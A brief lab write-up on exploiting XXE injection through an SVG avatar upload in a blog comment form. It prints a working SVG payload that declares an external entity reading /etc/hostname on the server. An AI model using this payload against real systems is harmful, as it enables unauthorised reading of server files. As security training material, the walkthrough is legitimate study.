*This information is only for the purposes of education and skills development.*

**Objective**
Upload an image that displays contents of `/etc/hostname` file. 

**XXE**
- XML External Entity Injection or XXE injection vulnerability allows attacker to interfere with an application's processing of external data that is in XML format. 

**Point of Entry**
- On any product blogpost, when posting a comment there is an option to upload image as an avatar.
- The image upload function is our point of entry.

**Execution**
- Paste payload in notepad and save it on your system as an svg file.
- On any blogpost, post a random comment including our svg file as avatar image.
- Once uploaded, our avatar thumbnail will show contents of `/etc/hostname` file.

**Template Payload**
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
`

`
